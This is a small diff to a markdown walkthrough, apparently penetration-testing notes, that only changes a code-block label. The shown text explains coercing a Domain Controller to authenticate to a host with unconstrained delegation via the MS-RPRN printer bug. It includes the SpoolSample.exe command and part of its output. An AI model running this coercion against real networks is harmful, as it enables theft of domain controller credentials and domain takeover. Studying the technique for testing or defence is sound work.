@@ -20,7 +20,7 @@ If the output shows the `spoolss` named pipe, it confirms that the print spooler
 The **MS-RPRN (Microsoft Print System Remote Protocol)** allows us to **coerce** authentication from a **Domain Controller** (CDC01) to a machine under our control (APPSRV01), which has **Unconstrained Delegation** enabled.
 
 Run **SpoolSample.exe**:
-```cmd
+```sh
 C:\Tools> SpoolSample.exe CDC01 APPSRV01
 [+] Converted DLL to shellcode
 [+] Executing RDI
